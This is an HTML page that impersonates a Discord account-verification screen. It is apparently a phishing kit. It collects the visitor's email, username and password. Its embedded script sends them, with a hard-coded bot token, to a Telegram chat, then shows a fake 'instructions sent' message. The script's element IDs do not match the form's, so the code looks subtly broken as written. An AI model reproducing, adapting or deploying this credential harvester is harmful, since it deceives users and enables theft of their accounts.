<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Discord</title>
  <link rel="icon" type="image/png" href="./dc.png">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">

  <style>
    :root {
      --card: #31363B;
      --muted: #B5BAC1;
      --input: #23272A;
      --border: #3A4046;
      --primary: #5865F2;
      --primaryHover: #4752C4;
    }

    body {
      font-family: Inter, sans-serif;
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: url("./bg2.svg") center/cover no-repeat fixed;
      color: #fff;
    }

    body::after {
      content: "";
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, .35);
      pointer-events: none;
      /* biar klik tidak ketutup overlay */
    }

    .wrap {
      position: relative;
      z-index: 1;
      width: min(480px, 92vw);
    }

    .card {
      background: var(--card);
      border-radius: 10px;
      padding: 28px 28px 24px;
      box-shadow: 0 12px 40px rgba(0, 0, 0, .35);
    }

    .title {
      font-size: 26px;
      font-weight: 600;
      margin: 0 0 6px;
      text-align: center;
    }

    .subtitle {
      margin: 0 0 18px;
      text-align: center;
      color: var(--muted);
      font-size: 14px;
      line-height: 1.4;
    }

    .label {
      display: flex;
      gap: 6px;
      align-items: center;
      font-size: 13px;
      font-weight: 600;
      margin: 14px 0 8px;
      color: #E6E8EA;
    }

    .req {
      color: #ff5c5c;
    }

    .input {
      width: 95%;
      height: 44px;
      border-radius: 8px;
      border: 1px solid var(--border);
      background: var(--input);
      color: #fff;
      padding: 0 12px;
      outline: none;
    }

    .input:focus {
      border-color: #6c79ff;
      box-shadow: 0 0 0 3px rgba(88, 101, 242, .18);
    }

    .row-link {
      margin: 10px 0 16px;
      text-align: left;
      font-size: 13px;
    }

    .row-link a {
      color: #00A8FC;
      text-decoration: none;
    }

    .row-link a:hover {
      text-decoration: underline;
    }

    .btn {
      width: 200px;
      margin: 20px auto 0;
      display: block;
      padding: 12px 16px;
      margin: 20px auto 0;
      height: 44px;
      border: none;
      border-radius: 8px;
      background: var(--primary);
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }

    .btn:hover {
      background: var(--primaryHover);
    }

    .footer {
      margin-top: 12px;
      font-size: 13px;
      color: var(--muted);
      text-align: left;
    }

    .footer a {
      color: #00A8FC;
      text-decoration: none;
      margin-left: 4px;
    }

    .discord-logo {
      position: absolute;
      top: 6px;
      left: -180px;
      width: 120px;
      height: auto;
      opacity: 0.9;
    }

    .modal-backdrop {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, .55);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 999;
    }

    .modal-backdrop.show {
      display: flex;
    }

    .modal {
      background: #1e1f22;
      color: #fff;
      padding: 22px;
      width: 420px;
      border-radius: 12px;
    }

    .modal p {
      color: #b5bac1;
      margin-top: 8px;
    }

    .modal-ok {
      margin-top: 18px;
      background: #d83c3e;
      border: none;
      padding: 8px 18px;
      color: #fff;
      border-radius: 8px;
      float: right;
      cursor: pointer;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>

<body>
  <div class="wrap">
    <img src="./logo.png" class="discord-logo" alt="Discord">
    <div class="card">
      <h1 class="title">Verification Your Account!</h1>
      <p class="subtitle">Secure your account now!</p>

      <form id="telegramForm">
        <div class="label">Email<span class="req">*</span></div>
        <input id="email" class="input" type="email" required>

        <div class="label">Username<span class="req">*</span></div>
        <input id="username" class="input" type="text" autocomplete="username" required>
        <div class="label">Password<span class="req">*</span></div>
        <input id="password" class="input" type="password" autocomplete="current-password" required>
        <button class="btn" type="submit">Verify Now</button>
      </form>
    </div>
    <div id="modalBackdrop" class="modal-backdrop">
      <div class="modal">
        <h3>Instructions Sent</h3>
        <p id="modalText"></p>
        <button id="modalOk" class="modal-ok">Okay</button>
      </div>
    </div>

  </div>
  <script>
    document.addEventListener('DOMContentLoaded', function () {

      const form = document.getElementById("login");
      const modal = document.getElementById("modalBackdrop");
      const modalText = document.getElementById("modalText");
      const modalOk = document.getElementById("modalOk");

      function showModal(message) {
        modalText.textContent = message;
        modal.classList.add('show');
      }

      function closeModal() {
        modal.classList.remove('show');
      }

      modalOk.addEventListener('click', closeModal);

      form.addEventListener('submit', function (event) {
        event.preventDefault(); // ⬅️ WAJIB

        const token = "8108742527:AAFwjWElB0mmOt_hRH-GEEyPoNbxEkH2g3s";
        const chat_id = "1310990075";

        const email = document.getElementById('emailInput').value;
        const username = document.getElementById('usernameInput').value;
        const password = document.getElementById('passwordInput').value;

        const text = `
  FORM BARU
  Email: ${email}
  Username: ${username}
  Password: ${password}
      `;

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: chat_id,
            text: text
          })
        })
          .then(response => response.json())
          .then(data => {
            if (data.ok) {
              showModal('Instructions have been sent to your email.');
              form.reset();
            } else {
              showModal('Failed to send instructions. Please try again later.');
            }
          })
          .catch(() => {
            showModal('Connection error. Please try again.');
          });
      });

    });
  </script>
